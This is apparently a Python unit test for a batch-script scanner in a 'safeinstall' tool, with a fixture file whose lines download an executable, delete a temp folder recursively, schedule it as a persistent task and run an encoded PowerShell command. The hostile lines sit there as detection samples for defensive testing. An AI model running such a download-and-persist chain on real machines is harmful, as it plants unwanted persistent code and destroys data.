from safeinstall.models import Capability, Severity, SourceFile
from safeinstall.scanners.batch import BatchScanner


def test_batch_scanner_detects_download_delete_and_persistence_commands() -> None:
    source = SourceFile(
        path="install.cmd",
        language="batch",
        content=(
            "REM del /s /q C:\\ignored\n"
            "curl -o helper.exe https://downloads.example/helper.exe\n"
            'rmdir /s /q "%TEMP%\\safeinstall-fixture"\n'
            "schtasks /create /tn ExampleFixture /tr helper.exe\n"
            "powershell -EncodedCommand %ENCODED_EXAMPLE%\n"
        ),
    )

    findings = BatchScanner().scan(source)

    assert [finding.rule_id for finding in findings] == [
        "SI-BAT-002",
        "SI-BAT-003",
        "SI-BAT-004",
        "SI-BAT-005",
    ]
    assert findings[-1].severity is Severity.CRITICAL
    assert Capability.PERSISTENCE in findings[2].capabilities
